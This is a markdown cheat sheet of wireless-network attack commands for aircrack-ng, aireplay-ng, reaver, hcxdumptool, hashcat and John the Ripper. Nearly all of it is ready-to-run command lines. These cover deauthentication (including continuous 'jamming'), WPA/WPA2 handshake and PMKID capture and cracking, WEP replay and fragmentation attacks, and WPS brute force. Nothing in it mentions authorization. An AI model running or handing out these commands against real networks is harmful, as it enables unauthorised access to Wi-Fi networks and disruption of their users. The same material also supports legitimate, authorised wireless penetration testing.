## Advanced Aircrack-ng Commands 📡

### Basic Workflow

**1. Enable Monitor Mode**
```bash
sudo airmon-ng check kill          # Kill interfering processes
sudo airmon-ng start wlan1         # Enable monitor mode
```

**2. Scan for Networks**
```bash
sudo airodump-ng wlan1mon          # Scan all channels
sudo airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX wlan1mon  # Target specific AP
```

**3. Capture Handshakes**
```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan1mon
```

**4. Deauth Attack (Force Handshake)**
```bash
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan1mon          # Deauth all clients
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC wlan1mon  # Target specific client
```

### Advanced Techniques

**WPA/WPA2 Cracking**
```bash
# Dictionary attack
aircrack-ng -w /path/to/wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# With ESSID filter
aircrack-ng -w wordlist.txt -e "NetworkName" capture-01.cap

# Using multiple CPU cores
aircrack-ng -w wordlist.txt capture-01.cap -p 4
```

**WEP Cracking**
```bash
# Fake authentication
sudo aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF -h YOUR:MAC wlan1mon

# ARP replay attack
sudo aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -h YOUR:MAC wlan1mon

# Crack WEP key
aircrack-ng capture-01.cap
```

**WPS Attacks**
```bash
# Scan for WPS-enabled networks
sudo wash -i wlan1mon

# Reaver attack (online brute force)
sudo reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -vv

# Pixie dust attack (offline)
sudo reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -vv -K
```

**PMKID Attack (No Clients Needed)**
```bash
# Capture PMKID
sudo hcxdumptool -i wlan1mon -o pmkid.pcapng --enable_status=1

# Convert to hashcat format
hcxpcaptool -z pmkid.16800 pmkid.pcapng

# Crack with hashcat
hashcat -m 16800 pmkid.16800 wordlist.txt
```

**Airodump-ng Advanced Options**
```bash
# Capture only handshakes (WPA)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture --output-format pcap wlan1mon

# Show manufacturers
sudo airodump-ng --manufacturer wlan1mon

# Focus on 5GHz band
sudo airodump-ng --band a wlan1mon

# Show only WPA networks
sudo airodump-ng --encrypt wpa wlan1mon
```

**Aireplay-ng Advanced Options**
```bash
# Continuous deauth (jamming)
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan1mon

# Interactive packet replay
sudo aireplay-ng --interactive wlan1mon

# Fragmentation attack
sudo aireplay-ng --fragment -b AA:BB:CC:DD:EE:FF -h YOUR:MAC wlan1mon

# Chopchop attack
sudo aireplay-ng --chopchop -b AA:BB:CC:DD:EE:FF -h YOUR:MAC wlan1mon
```

**Converting Capture Files**
```bash
# Convert cap to hccapx (for hashcat)
cap2hccapx.bin capture-01.cap output.hccapx

# Merge multiple capture files
mergecap -w merged.cap capture-*.cap

# Clean/filter capture file
wpaclean cleaned.cap capture-01.cap
```

**Cracking with External Tools**
```bash
# Hashcat WPA/WPA2
hashcat -m 2500 capture.hccapx wordlist.txt

# Hashcat with rules
hashcat -m 2500 capture.hccapx wordlist.txt -r rules/best64.rule

# John the Ripper
hccap2john capture.hccap > hash.txt
john --wordlist=wordlist.txt hash.txt
```
****

## Additional Resources 📚

**Documentation**
- Aircrack-ng: https://www.aircrack-ng.org/documentation.html
